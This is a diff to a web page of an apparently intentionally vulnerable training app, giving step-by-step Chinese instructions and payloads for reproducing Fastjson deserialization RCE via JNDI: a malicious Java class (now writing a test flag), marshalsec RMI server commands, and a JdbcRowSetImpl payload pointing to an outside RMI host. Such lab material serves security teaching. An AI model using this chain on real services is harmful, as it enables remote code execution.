@@ -42,30 +42,38 @@
                                     @click="fetchDataAndFillTable1">去测试</el-button>
                             </div></el-row>
                         <pre v-highlightjs><code class="java">// 漏洞复现步骤
-1、构造静态恶意类，并编译成 evilcalc.class 文件
+1、构造静态恶意类，并编译成 evil.class 文件
     import java.lang.Runtime;
     import java.lang.Process;
+    import java.io.IOException;
+    import java.io.FileWriter;
 
-    public class evilcalc {
-        public evilcalc (){
+    public class evil {
+        public evil (){
             try{
-                // Runtime.getRuntime().exec("calc.exe"); // Windows
-                Runtime.getRuntime().exec("open -a Calculator"); // macOS
+                // Runtime.getRuntime().exec("calc.exe"); // Windows本地源码部署
+                // Runtime.getRuntime().exec("open -a Calculator"); // macOS本地源码部署
+                String content = "This is a test flag";
+                String filePath = "/app/flag.txt";
+                
+                FileWriter writer = new FileWriter(filePath);
+                writer.write(content);
+                writer.close();
             }catch (Exception e){
                 e.printStackTrace();
             }
         }
         public static void main(String[] argv){
-            evilcalc e = new evilcalc();
+            evil e = new evil();
         }
     }
 
-2、将 evilcalc.class 放到任意http服务器上(如：python3 -m http.server 8088)
-3、部署rmi/ldap服务，关联静态恶意类（如：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://xx.xx.xx.xx:8088/#evilcalc" 9999）
+2、将 evil.class 放到任意http服务器上(如：python3 -m http.server 8088)
+3、部署rmi/ldap服务，关联静态恶意类（如：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://xx.xx.xx.xx:8088/#evil" 9999）
 4、发送payload请求到fastjson漏洞接口
     {
         "@type":"com.sun.rowset.JdbcRowSetImpl",
-        "dataSourceName":"rmi://150.109.15.229:9999/evilcalc",
+        "dataSourceName":"rmi://150.109.15.229:9999/evil",
         "autoCommit":true
     }
 
@@ -153,9 +161,9 @@ public String safe1(@RequestBody String content) {
         <el-dialog title="Fastjson反序列化测试" :visible.sync="dialogFormVisible1" class="center-dialog">
             <div style="text-align: left; color: red; font-style: italic;">
                 注意，需要提前先完成下面两步准备工作：<br>
-                1、将 evilcalc.class 放到任意http服务器上(如：python3 -m http.server 8088)<br>
+                1、将 evil.class 放到任意http服务器上(如：python3 -m http.server 8088)<br>
                 2、部署rmi/ldap服务，关联静态恶意类（如：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer
-                "http://xx.xx.xx.xx:8088/#evilcalc" 9999）
+                "http://xx.xx.xx.xx:8088/#evil" 9999）
             </div>
             <el-form class="demo-form-inline">
                 <el-form-item label="Payload1">
@@ -180,9 +188,9 @@ public String safe1(@RequestBody String content) {
         <el-dialog title="Fastjson反序列化测试" :visible.sync="dialogFormVisible2" class="center-dialog">
             <div style="text-align: left; color: red; font-style: italic;">
                 注意，需要提前先完成下面两部准备工作：<br>
-                1、将 evilcalc.class 放到任意http服务器上(如：python3 -m http.server 8088)<br>
+                1、将 evil.class 放到任意http服务器上(如：python3 -m http.server 8088)<br>
                 2、部署rmi/ldap服务，关联静态恶意类（如：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer
-                "http://xx.xx.xx.xx:8088/#evilcalc" 9999）
+                "http://xx.xx.xx.xx:8088/#evil" 9999）
             </div>
             <el-form class="demo-form-inline">
                 <el-form-item label="Payload1">
@@ -222,7 +230,7 @@ export default {
             },
             payload2: {
                 "@type": "com.sun.rowset.JdbcRowSetImpl",
-                "dataSourceName": "rmi://150.109.15.229:9999/evilcalc",
+                "dataSourceName": "rmi://150.109.15.229:9999/evil",
                 "autoCommit": true
             },
             resp_text1: '',
